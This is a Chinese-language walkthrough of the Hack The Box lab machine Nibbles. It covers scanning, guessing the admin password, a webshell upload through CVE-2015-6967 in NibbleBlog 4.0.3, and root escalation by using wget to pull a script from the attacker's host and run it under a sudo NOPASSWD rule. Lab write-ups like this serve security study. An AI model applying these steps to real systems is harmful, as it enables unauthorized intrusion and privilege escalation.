# Nibbles

## 信息收集

nmap收一下信息：

```
─$ sudo nmap -sV 10.10.10.75        
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-25 02:16 CDT
Nmap scan report for 10.10.10.75
Host is up (0.40s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.11 seconds
```

大概率还是web页面的突破口，收集一下信息。

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-25T07-20-02.190Z.png)

```
└─$ sudo python3 dirsearch.py -u 10.10.10.75                     130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2.8                                     
 (_||| _) (/_(_|| (_| )                                                
                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11374

Output File: /home/tsunamori/L/tools/dirsearch/reports/_10.10.10.75/_22-08-25_02-21-58.txt

Target: http://10.10.10.75/

[02:21:58] Starting:                                                   
[02:22:13] 403 -  297B  - /.ht_wsr.txt
[02:22:13] 403 -  300B  - /.htaccess.bak1
[02:22:13] 403 -  302B  - /.htaccess.sample
[02:22:13] 403 -  300B  - /.htaccess.orig
[02:22:13] 403 -  300B  - /.htaccess_orig
[02:22:13] 403 -  301B  - /.htaccess_extra
[02:22:13] 403 -  300B  - /.htaccess.save
[02:22:13] 403 -  298B  - /.htaccess_sc
[02:22:13] 403 -  298B  - /.htaccessBAK
[02:22:13] 403 -  298B  - /.htaccessOLD
[02:22:13] 403 -  299B  - /.htaccessOLD2
[02:22:13] 403 -  290B  - /.htm
[02:22:13] 403 -  291B  - /.html
[02:22:13] 403 -  300B  - /.htpasswd_test
[02:22:13] 403 -  296B  - /.htpasswds
[02:22:13] 403 -  297B  - /.httr-oauth
[02:22:17] 403 -  290B  - /.php
[02:22:17] 403 -  291B  - /.php3
[02:24:05] 403 -  300B  - /server-status/
[02:24:05] 403 -  299B  - /server-status
```

![image](../../%E5%9B%BE%E5%BA%8A/Screenshot_2022-08-25_02-44-49.png)

目录并没有发现什么有意思的东西，但是查看源码时看到了提示，访问/nibbleblog/。

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-25T07-47-25.417Z.png)

```
└─$ sudo python3 dirsearch.py -u 10.10.10.75/nibbleblog/
[sudo] password for tsunamori: 

  _|. _ _  _  _  _ _|_    v0.4.2.8                                     
 (_||| _) (/_(_|| (_| )                                                
                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11374

Output File: /home/tsunamori/L/tools/dirsearch/reports/_10.10.10.75/_nibbleblog__22-08-25_20-59-56.txt

Target: http://10.10.10.75/

[20:59:56] Starting: nibbleblog/                                       
[21:00:10] 403 -  308B  - /nibbleblog/.ht_wsr.txt
[21:00:10] 403 -  311B  - /nibbleblog/.htaccess.bak1
[21:00:10] 403 -  313B  - /nibbleblog/.htaccess.sample
[21:00:10] 403 -  311B  - /nibbleblog/.htaccess.orig
[21:00:10] 403 -  311B  - /nibbleblog/.htaccess_orig
[21:00:10] 403 -  311B  - /nibbleblog/.htaccess.save
[21:00:10] 403 -  312B  - /nibbleblog/.htaccess_extra
[21:00:10] 403 -  309B  - /nibbleblog/.htaccess_sc
[21:00:10] 403 -  309B  - /nibbleblog/.htaccessOLD
[21:00:10] 403 -  309B  - /nibbleblog/.htaccessBAK
[21:00:10] 403 -  310B  - /nibbleblog/.htaccessOLD2
[21:00:10] 403 -  301B  - /nibbleblog/.htm
[21:00:10] 403 -  302B  - /nibbleblog/.html
[21:00:10] 403 -  311B  - /nibbleblog/.htpasswd_test
[21:00:10] 403 -  307B  - /nibbleblog/.htpasswds
[21:00:10] 403 -  308B  - /nibbleblog/.httr-oauth
[21:00:14] 403 -  301B  - /nibbleblog/.php
[21:00:14] 403 -  302B  - /nibbleblog/.php3
[21:00:28] 301 -  321B  - /nibbleblog/admin  ->  http://10.10.10.75/nibbleblog/admin/
[21:00:29] 200 -    1KB - /nibbleblog/admin.php
[21:00:29] 200 -    2KB - /nibbleblog/admin/
[21:00:31] 301 -  332B  - /nibbleblog/admin/js/tinymce  ->  http://10.10.10.75/nibbleblog/admin/js/tinymce/
[21:00:31] 200 -    2KB - /nibbleblog/admin/js/tinymce/
[21:01:00] 301 -  323B  - /nibbleblog/content  ->  http://10.10.10.75/nibbleblog/content/
[21:01:01] 200 -    1KB - /nibbleblog/content/
[21:01:01] 200 -    1KB - /nibbleblog/COPYRIGHT.txt
[21:01:22] 200 -   78B  - /nibbleblog/install.php
[21:01:22] 200 -   78B  - /nibbleblog/install.php?profile=default
[21:01:25] 301 -  325B  - /nibbleblog/languages  ->  http://10.10.10.75/nibbleblog/languages/
[21:01:27] 200 -   34KB - /nibbleblog/LICENSE.txt
[21:01:45] 301 -  323B  - /nibbleblog/plugins  ->  http://10.10.10.75/nibbleblog/plugins/
[21:01:46] 200 -    4KB - /nibbleblog/plugins/
[21:01:50] 200 -    5KB - /nibbleblog/README
[21:02:05] 301 -  322B  - /nibbleblog/themes  ->  http://10.10.10.75/nibbleblog/themes/
[21:02:05] 200 -    2KB - /nibbleblog/themes/
[21:02:07] 200 -    2KB - /nibbleblog/update.php
```
这里访问/nibbleblog/admin.php

![image](../../%E5%9B%BE%E5%BA%8A/Screenshot_2022-08-26_02-55-13.png)

这里其实是个比较伤的点，帐号可以从之前的目录里找到，但密码实际上在我自己查找和看WP里都没找到，搜索该模板的默认帐密也找不到（而且后续去看WP复盘，登录口有login blacklist配置，需要手工猜解密码）。

帐密是admin/nipples。估计这个点也是为什么本box评分比较低的原因之一。

登录进去就要找模板的通用漏洞来提取，找到15年有一个CVE。

从之前搜的目录README里，也可以确认靶机使用的就是存在漏洞的4.0.3版本。

![image](../../%E5%9B%BE%E5%BA%8A/Screenshot_2022-08-26_00-42-20.png)

## 漏洞利用

根据[CVE-2015-6967 WP](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)来做相应利用。

上传一个shell文件，这里直接传了一个冰蝎马。

![image](../../%E5%9B%BE%E5%BA%8A/Screenshot_2022-08-26_03-08-15.png)

shell地址都是统一的 `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`

可以直接拿到user.txt。

接下来就是提权，这里还是做个[反弹shell](https://blog.csdn.net/weixin_45745344/article/details/112321742)比较合适（这里就是给自己挖了个坑，如果直接传一个反弹shell上去，nc监听就完事了，用不上msf，后来也确实换成普通的反弹shell脚本了）。

![image](../../%E5%9B%BE%E5%BA%8A/Screenshot_2022-08-26_03-47-14.png)

```
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
/home/nibbler/personal/stuff/$ head monitor.sh
cd /home/nibbler/personal/stuff
/bin/sh: 3: cd: can't cd to /home/nibbler/personal/stuff
```
然而这个位置下是没有/personal/stuff/monitor.sh的，要自己新建。

建好之后，本地起http服务，新建一个monitor.sh，内容写 `bash -i`。（非root权限下执行bash -i就可以切换到root权限）

当然这里也可以在sh文件里[写入反弹shell的语句来执行](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)。。。

```
$ wget 10.10.16.2/monitor.sh
--2022-08-26 05:29:17--  http://10.10.16.2/monitor.sh
Connecting to 10.10.16.2:80... failed: Connection refused.
$ wget 10.10.16.2/monitor.sh
--2022-08-26 05:31:38--  http://10.10.16.2/monitor.sh
Connecting to 10.10.16.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7 [text/x-sh]
Saving to: 'monitor.sh'

     0K                                                       100% 1.14M=0s

2022-08-26 05:31:39 (1.14 MB/s) - 'monitor.sh' saved [7/7]

$ chmod +x monitor.sh
$ ls -l
total 4
-rwxr-xr-x 1 nibbler nibbler 7 Aug 26 05:30 monitor.sh
$ sudo ./monitor.sh
bash: cannot set terminal process group (1368): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
```




